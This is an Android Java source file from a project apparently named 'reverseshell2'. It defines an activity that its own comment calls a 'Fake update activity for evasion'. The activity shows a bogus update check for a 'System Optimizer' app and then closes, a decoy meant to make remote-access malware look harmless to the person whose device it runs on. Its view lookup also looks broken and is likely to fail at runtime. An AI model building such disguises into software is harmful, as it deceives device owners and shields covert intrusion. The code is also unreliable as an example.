package com.example.reverseshell2;

import android.app.Activity;
import android.os.Bundle;
import android.widget.TextView;
import android.widget.ProgressBar;
import android.widget.LinearLayout;
import android.view.ViewGroup;
import java.util.Random;

/**
 * Fake update activity for evasion - simulates app update process
 */
public class UpdateActivity extends Activity {
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Create fake update interface
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(40, 40, 40, 40);
        
        TextView titleText = new TextView(this);
        titleText.setText("Checking for Updates...");
        titleText.setTextSize(18);
        titleText.setPadding(0, 0, 0, 30);
        
        ProgressBar progressBar = new ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal);
        progressBar.setLayoutParams(new ViewGroup.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, 
            ViewGroup.LayoutParams.WRAP_CONTENT));
        progressBar.setProgress(new Random().nextInt(100));
        
        TextView statusText = new TextView(this);
        statusText.setText("System Optimizer is up to date.\nVersion 2.1.3 (Build 2024.01.15)");
        statusText.setPadding(0, 30, 0, 0);
        statusText.setTextSize(14);
        
        layout.addView(titleText);
        layout.addView(progressBar);
        layout.addView(statusText);
        
        setContentView(layout);
        
        // Auto-close after simulating update check
        simulateUpdateCheck();
    }
    
    private void simulateUpdateCheck() {
        new Thread(() -> {
            try {
                // Simulate network delay for update check
                Thread.sleep(new Random().nextInt(3000) + 2000);
                
                runOnUiThread(() -> {
                    TextView statusText = (TextView) ((LinearLayout) findViewById(android.R.id.content).getRootView()).getChildAt(2);
                    statusText.setText("Your app is up to date!");
                    
                    // Close after showing result
                    new Thread(() -> {
                        try {
                            Thread.sleep(2000);
                            runOnUiThread(() -> finish());
                        } catch (InterruptedException e) {
                            Thread.currentThread().interrupt();
                        }
                    }).start();
                });
                
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
        }).start();
    }
}